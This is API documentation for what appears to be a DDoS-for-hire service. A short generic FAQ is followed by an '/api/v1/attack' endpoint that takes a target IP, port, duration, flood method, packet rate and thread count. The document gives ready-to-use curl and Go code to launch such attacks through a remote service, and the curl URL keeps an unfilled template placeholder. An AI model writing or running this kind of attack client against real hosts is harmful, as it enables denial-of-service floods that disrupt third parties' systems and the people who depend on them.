API Documentation

How do I get an API key?
You can obtain an API key by registering for an account and navigating to the API Access section in your dashboard. Make sure to keep your API key secure and never share it publicly.
What are the rate limits?
Rate limits vary by plan. Basic plans are limited to 100 requests per minute, while premium plans can handle up to 1000 requests per minute. Contact support for custom limits.
How do I handle API errors?
All API errors return standard HTTP status codes along with a JSON response containing an error message and code. We recommend implementing proper error handling and retrying failed requests with exponential backoff.
Is there a testing environment available?
Yes, we provide a sandbox environment for testing. Use the test API key prefix 'sk_test_' instead of 'sk_live_' to make test requests. The sandbox environment is completely separate from production.

POST /api/v1/attack

Launch a new attack with specified parameters.

curl -X POST {{.Domain}}v1/attack \
-H 'Authorization: Bearer YOUR_API_KEY' \
-H 'Content-Type: application/json' \
-d '{
    "username": "user123",
    "key": "your_api_key",
    "host": "example.com",
    "target": "1.2.3.4",
    "port": 80,
    "time": 30,
    "method": "TCP",

    "threads": 5
}'

package main

import (
    "bytes"
    "encoding/json"
    "net/http"
)

func main() {
    data := map[string]interface{}{
        "username": "user123",
        "key":      "your_api_key",
        "host":     "example.com",
        "target":   "1.2.3.4",
        "port":     80,
        "time":     30,
        "method":   "TCP",
        "pps":      1000,
        "threads":  5,
    }
    
    jsonData, _ := json.Marshal(data)
    
    req, _ := http.NewRequest("POST", "https://api.secureauth.pro/v1/attack", bytes.NewBuffer(jsonData))
    req.Header.Set("Authorization", "Bearer YOUR_API_KEY")
    req.Header.Set("Content-Type", "application/json")
    
    client := &http.Client{}
    resp, _ := client.Do(req)
    defer resp.Body.Close()
}
